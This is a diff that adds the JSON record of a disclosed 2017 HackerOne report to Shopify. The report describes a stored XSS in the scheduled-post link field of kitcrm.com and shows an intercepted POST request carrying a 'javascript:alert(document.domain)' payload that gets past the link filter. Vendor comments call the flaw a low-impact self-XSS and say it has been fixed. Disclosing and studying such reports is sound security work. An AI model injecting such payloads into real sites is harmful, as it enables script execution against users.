@@ -1,0 +1,144 @@
+{
+  "id": 214581,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ1ODE=",
+  "url": "https://hackerone.com/reports/214581",
+  "title": "Stored passive XSS at scheduled posts (kitcrm.com)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-19T00:26:18.178Z",
+  "submitted_at": "2017-03-19T00:26:18.178Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-03-28T20:57:36.389Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-28T20:57:36.359Z",
+  "team_member_agreed_on_going_public_at": "2017-03-28T20:31:36.493Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello!\n\nThere is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:\n\n```http\nPOST /pages/175422/manual_posts/31163 HTTP/1.1\nHost: kitcrm.com\n<redacted>\n\n-----------------------------15916813141840537191014403553\nContent-Disposition: form-data; name=\"manual_post[link]\"\n\njavascript:alert(document.domain);//http://\n-----------------------------15916813141840537191014403553\n<redacted>\n```\n\nthat leads to filter bypass and JS execution while victim clicks the link:\n\n{F169880}\n",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 169880,
+      "file_name": "______________2017-03-19___3.24.18.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/880/de6e4e0c6336bfaf8ebfaf057b224e0fc218f116/______________2017-03-19___3.24.18.png?response-content-disposition=attachment%3B%20filename%3D%22______________2017-03-19___3.24.18.png%22%3B%20filename%2A%3DUTF-8%27%27______________2017-03-19___3.24.18.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQRWE5CGQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T231158Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDLucJCVzPGDbjS%2BDgz2NOmRozTiWOO5zOZecU7uqLYrwIgIj6fBrzvtiVEMdKIwHSnjDZw1CAxqcZJmF0AoYBRjLMqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDM1sziKy9fZSvRR1DyqPBTjTgRLYqW7AclHlt2G%2F4pnVrz2BLMfbK1VRkFES8JYW%2Bb7j9Hj3J8Lr6zTle0kBPpWEPDfYAI6TCKyqDQaHjV4wRLAiIEAu022fvBPui1b2sBpQKQqBL%2BYkNgFjiex4Y0p9puW8RQxa%2BUA7ogsiPm3eLst%2Fb%2BVSdRIzbCsg4KolPlFIMVu6IALYRuagDOr670yPIRmTizdhdGSj%2FcrVkyt34cOPlwKkOfk3GLfsMAEjEGtidIjEa2jGSqDxWbwmLkk%2FNvE6HnaTB3NKuP9km6nE2bWBZI0njCuSM2kLEna3FWJ1QqLoLVXGxhMOwQh9wG4El1hAhZXfkKPZ3F4LmeO8pzgBOHxUfoOcc%2F434Tv4Ggtl0CwoVF61jeDkfeYKIcQOOdDFjAPOmslH40kz12sWoACNBKSfSLiH9XzXpUVx7XB0O4GV2kn3%2BlrSiqmJPB0khb3cEg%2BWMe455qxIP2KK8GP08E1Z19JChj9LEpl1VBODNggDc9Hu1HgvHz9DEczbeoY0iL90VwtSP3Z02Mif2gJEbXPxhEDnx%2BMuCNwDc5OlnSfoTQ9tv7lDs%2FyVr%2FnPaj8xixT%2FRj%2FiC8l5edGLpCCEswDcEgr1jeptF86oXCIW5Qa8ekNmVgnB5NfAsb%2B8sX%2B3InEuwQgv5P1AGYiIhiy4TQiEqOVucP3MHjuHfVNsRGVP16Dmkp50ib2rvDmkiLI68wwl%2Fx%2FM2RuwYnHPp7ZMqimBcGqrCojXZqVbXERYUrKppELX1%2FEY4gmURf%2Bwt3V2O76ml23389bOvxd3pGw1fmyK5WjBMmjKKB7%2FOBL4whXe5wxCcl6vHqDk1Te%2BekrLml3C9V%2FJZDpJ13iUMqIHhN1jSmdWs5RlcSIw87fBxgY6sQGRUi3Az21sTqNlFYngcMx%2FXoJka7q00aRbUfvc49zhHsYTQS%2BIkEW4RG5oOIlxGItjomUEnAhMxOvQ5WtA0jB8%2F9ctqODM6O7ZDIysMRnRjDrlOL3sfiI578wpLf%2BCiMWeQGs5bou9XdM4851%2By0mtupoYmYLHvsC17d0A%2BnSpyhNPxGpRKMXO107c8sUwFzn5XKuO0s5SZ3mW0aXkqnBKVpbACfkIdfaYWviMfXDmS6Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4abd6ff947b0d9b9de319fcb80468e2625fb1bf9fd4c6ca445d292c735eaa680",
+      "file_size": 245671,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "drsniper",
+    "flashdisk",
+    "eveeez",
+    "linkks",
+    "0xm1racle",
+    "spetr0x",
+    "icheernoom"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 3676,
+      "category": "team",
+      "content": "This is a stored XSS within the Kit app (kitcrm.com). It would only be visible in a user's own account, making this a self-XSS with low value, but we still fixed the issue since only http links should have been displayed there.",
+      "updated_at": "2017-03-28T20:35:55.845Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 19168,
+        "username": "francoischagnon",
+        "name": "Francois Chagnon",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "",
+        "location": "",
+        "created_at": "2015-03-19T21:06:55.673Z",
+        "url": "https://hackerone.com/francoischagnon",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NDQ3MSwicHVyIjoiYmxvYl9pZCJ9fQ==--5d363de94e2545bc9fc3f333250059f6ae61ed9f/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/2014-03-24.jpg"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
